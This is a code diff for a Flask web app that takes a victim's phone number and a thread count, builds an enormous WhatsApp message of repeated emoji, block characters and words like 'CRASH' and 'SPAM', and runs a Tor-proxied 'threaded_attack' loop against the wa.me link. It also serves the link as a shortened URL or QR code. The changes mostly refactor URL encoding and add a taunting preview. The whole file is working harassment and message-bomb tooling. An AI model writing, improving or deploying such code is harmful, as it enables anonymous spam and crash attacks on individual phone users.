@@ -1,19 +1,24 @@
 # app.py
 
 from flask import Flask, render_template, request, jsonify
-import threading, time, requests, qrcode
+import threading, time, requests, qrcode, urllib.parse, os
 from io import BytesIO
 from base64 import b64encode
 
 app = Flask(__name__)
 
 USE_TOR = True
-PROXIES = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"} if USE_TOR else {}
+PROXIES = {
+    "http": "socks5h://127.0.0.1:9050",
+    "https": "socks5h://127.0.0.1:9050"
+} if USE_TOR else {}
 
 def generate_massive_message():
-    base = ["*trhacknon*", "BOOM", "CRASH", "WHATSAPP", "SPAM", "██", "▒▒", "░░",
-            "⚠️", "🚫", "⛔", "🚨", "🔥", "⚡", "🛑", "😈", "👾", "👽",
-            "☠️", "🌀", "📛", "🧠", "🔒", "💣", "🔗"]
+    base = [
+        "*trhacknon*", "BOOM", "CRASH", "WHATSAPP", "SPAM", "██", "▒▒", "░░",
+        "⚠️", "🚫", "⛔", "🚨", "🔥", "⚡", "🛑", "😈", "👾", "👽",
+        "☠️", "🌀", "📛", "🧠", "🔒", "💣", "🔗"
+    ]
     repeat_block = "%0A".join([f"{word} " * 10 for word in base])
     return (repeat_block + "%0A") * 30 + "GitHub: https://github.com/trh4ckn0n"
 
@@ -27,7 +32,7 @@ def generate():
     phone = data.get('phone')
     threads = int(data.get('threads', 10))
     message = generate_massive_message()
-    encoded = message.replace(" ", "%20").replace("\n", "%0A")
+    encoded = urllib.parse.quote(message)
     wa_url = f"https://wa.me/{phone}?text={encoded}"
 
     def threaded_attack():
@@ -36,14 +41,15 @@ def generate():
             time.sleep(0.8)
 
     threading.Thread(target=threaded_attack).start()
-    return jsonify({"status": "sent", "url": wa_url})
+    preview = f"Message : trhacknon vous explose + spam visuel\nURL : {wa_url}"
+    return jsonify({"status": "sent", "url": wa_url, "preview": preview})
 
 @app.route('/shorten', methods=['POST'])
 def shorten():
     data = request.json
     phone = data.get('phone')
     message = generate_massive_message()
-    encoded = message.replace(" ", "%20").replace("\n", "%0A")
+    encoded = urllib.parse.quote(message)
     wa_url = f"https://wa.me/{phone}?text={encoded}"
 
     try:
@@ -57,7 +63,7 @@ def generate_qr():
     data = request.json
     phone = data.get('phone')
     message = generate_massive_message()
-    encoded = message.replace(" ", "%20").replace("\n", "%0A")
+    encoded = urllib.parse.quote(message)
     wa_url = f"https://wa.me/{phone}?text={encoded}"
 
     qr = qrcode.QRCode(box_size=6, border=2)
